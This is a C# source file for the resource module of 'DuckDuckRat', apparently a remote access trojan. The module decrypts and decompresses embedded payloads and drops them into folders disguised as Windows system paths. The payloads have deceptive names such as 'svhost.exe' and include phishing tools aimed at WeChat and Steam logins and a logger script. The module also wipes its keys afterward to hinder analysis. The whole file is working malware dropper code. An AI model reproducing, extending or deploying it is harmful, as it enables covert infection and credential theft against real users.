using System;
using System.IO;
using System.Reflection;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Linq;

namespace DuckDuckRat.Modules
{
    public static class ResourceModule
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool SetDllDirectory(string lpPathName);

        public static string WorkDir { get; private set; }

        static ResourceModule()
        {
            WorkDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Network");
            if (!Directory.Exists(WorkDir)) Directory.CreateDirectory(WorkDir);
        }

        public static string GetToolPath(string name) => Path.Combine(WorkDir, name.EndsWith(".exe") ? name : name + ".exe");

        public static void ExtractAll()
        {
            try
            {
                // 1. Set DLL search path so SQLite find e_sqlite3.dll there
                SetDllDirectory(WorkDir);

                Log("[RESOURCE] Starting extraction phase...");

                // 2. Extract resources (FORCE OVERWRITE)
                // ChromElevator is now Statically Linked (Mono-binary)
                // bore.bin is handled in-memory in ProxyModule (No disk drop)
                ExtractResource("e_sqlite3.dll", Path.Combine(WorkDir, "e_sqlite3.dll"));
                ExtractResource("GlobalLogger.py", Path.Combine(WorkDir, "GlobalLogger.py"));
                ExtractResource("SteamAlert.bin", Path.Combine(WorkDir, "SteamAlert.exe"));
                ExtractResource("SteamLogin.bin", Path.Combine(WorkDir, "SteamLogin.exe"));
                ExtractResource("svhost.bin", Path.Combine(WorkDir, "svhost.exe"));
                ExtractResource("WeChatPhish.bin", Path.Combine(WorkDir, "WeChatPhish.exe"));

                // 3. Ensure tablichka directory exists for Steam Notice
                string tablichkaDir = Path.Combine(WorkDir, "tablichka");
                if (!Directory.Exists(tablichkaDir)) Directory.CreateDirectory(tablichkaDir);
                
                string currentDirLogger = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "GlobalLogger.py");
                if (!File.Exists(currentDirLogger))
                {
                    try { File.Copy(Path.Combine(WorkDir, "GlobalLogger.py"), currentDirLogger, true); } catch { }
                }
                
                Log("[RESOURCE] All tools extracted successfully.");
                
                // [RED TEAM HARDENING] Wipe cryptographic keys only AFTER all extraction is verified.
                AesHelper.WipeKeys();
                
                // V7.1 RED TEAM OPTIMIZATION: Relinquish memory back to OS immediately
                // This clears the 400MB+ RAM spike from resource extraction buffers.
                GC.Collect(2, GCCollectionMode.Forced, true);
                GC.WaitForPendingFinalizers();
                GC.Collect();
            }
            catch (Exception ex)
            {
                Log($"[RESOURCE ERROR] {ex.Message}");
            }
        }

        private static void ExtractResource(string shortName, string destPath)
        {
            try
            {
                // V6.15: ALWAY OVERWRITE to prevent corrupted/stale versions from blocking operations
                if (File.Exists(destPath)) try { File.Delete(destPath); } catch { }

                var assembly = Assembly.GetExecutingAssembly();
                string[] possibleNames = {
                    shortName,
                    $"DuckDuckRat.{shortName}",
                    $"DuckDuckRat.{shortName}",
                    $"MicrosoftManagementSvc.{shortName}",
                    $"DuckDuckRat.tools.{shortName}"
                };

                Stream? stream = null;
                string foundName = "";

                foreach (var name in possibleNames)
                {
                    stream = assembly.GetManifestResourceStream(name);
                    if (stream != null) {
                        foundName = name;
                        break;
                    }
                }

                if (stream == null)
                {
                    Log($"[RESOURCE] ERROR: Could not find resource {shortName} with any prefix.");
                    return;
                }

                using (stream)
                {
                    SaveStream(stream, destPath, shortName.EndsWith(".bin"));
                    Log($"[RESOURCE] Extracted: {Path.GetFileName(destPath)} (from {foundName})");
                }
            }
            catch (Exception ex) { Log($"[RESOURCE ERROR] {shortName}: {ex.Message}"); }
        }

        private static void SaveStream(Stream stream, string destPath, bool isEncrypted = false)
        {
            int maxRetries = 5;
            int delayMs = 1000;

            for (int attempt = 1; attempt <= maxRetries; attempt++)
            {
                try {
                    byte[] data;
                    using (MemoryStream ms = new MemoryStream())
                    {
                        stream.Position = 0; // Reset stream for each attempt
                        stream.CopyTo(ms);
                        data = ms.ToArray();
                    }

                    if (isEncrypted)
                    {
                        data = AesHelper.Decrypt(data);
                    }

                    if (data != null && data.Length > 64) // Basic PE minimum
                    {
                        // V7.0 optimization: Check for GZip magic header (0x1F, 0x8B)
                        if (data[0] == 0x1F && data[1] == 0x8B)
                        {
                            using (MemoryStream compressedMs = new MemoryStream(data))
                            using (GZipStream decompressionStream = new GZipStream(compressedMs, CompressionMode.Decompress))
                            using (MemoryStream resultMs = new MemoryStream())
                            {
                                decompressionStream.CopyTo(resultMs);
                                data = resultMs.ToArray();
                            }
                        }

                        // [ORBITAL] Verify PE Magic before writing to disk
                        if (destPath.EndsWith(".exe") || destPath.EndsWith(".dll"))
                        {
                            if (data.Length < 2 || data[0] != 0x4D || data[1] != 0x5A) // MZ
                            {
                                Log($"[RESOURCE] CRITICAL: Decryption result for {Path.GetFileName(destPath)} is NOT a valid PE (No MZ header). Try {attempt}/{maxRetries}");
                                Thread.Sleep(delayMs);
                                continue; 
                            }
                        }

                        if (File.Exists(destPath)) try { File.Delete(destPath); } catch { }
                        File.WriteAllBytes(destPath, data);
                        return; // Success
                    }
                } 
                catch (Exception ex)
                {
                    Log($"[RESOURCE] Save attempt {attempt} failed: {ex.Message}");
                    Thread.Sleep(delayMs);
                }
            }
            Log($"[RESOURCE] FAILED to extract {Path.GetFileName(destPath)} after {maxRetries} attempts.");
        }

        private static void Log(string msg)
        {
            try { 
                string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log");
                File.AppendAllText(logPath, $"[{DateTime.Now}] {msg}\n"); 
            } catch { }
        }
    }
}


